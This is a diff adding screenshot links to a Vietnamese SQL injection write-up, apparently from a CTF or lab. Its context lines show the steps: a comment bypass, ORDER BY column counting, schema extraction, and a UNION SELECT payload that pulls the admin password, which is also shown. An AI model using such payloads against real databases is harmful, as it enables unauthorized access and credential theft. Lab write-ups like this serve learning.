@@ -22,6 +22,8 @@
 **Bypass lỗi**: Thêm comment `--`  
 → Lỗi biến mất, xác nhận có thể khai thác SQLi.
 
+![](../../../img/Pisture2.png)
+
 ---
 
 ### Xác định số cột
@@ -30,6 +32,8 @@ Sử dụng `ORDER BY` để tìm số cột của bảng:
 
 - `ORDER BY 1`, `ORDER BY 2` → OK  
 - `ORDER BY 3` → Lỗi
+  
+![](../../../img/Pisture3.png)
 
 **Kết luận**: Bảng đang query có **2 cột**.
 
@@ -45,6 +49,8 @@ Payload lấy danh sách bảng:
 
 → Phát hiện bảng **`users`**.
 
+![](../../../img/Pisture4.png)
+
 Lấy cấu trúc bảng:
 
 ```sql
@@ -56,6 +62,8 @@ Kết quả:
 ```sql
 CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)
 ```
+
+![](../../../img/Pisture5.png)
 
 ---
 
@@ -75,6 +83,8 @@ Kết quả:
 ```sql
 ' UNION SELECT username, password FROM users WHERE username='admin';--
 ```
+
+![](../../../img/Pisture6.png)
 
 → Password đúng: **`t0_W34k!$`**
 
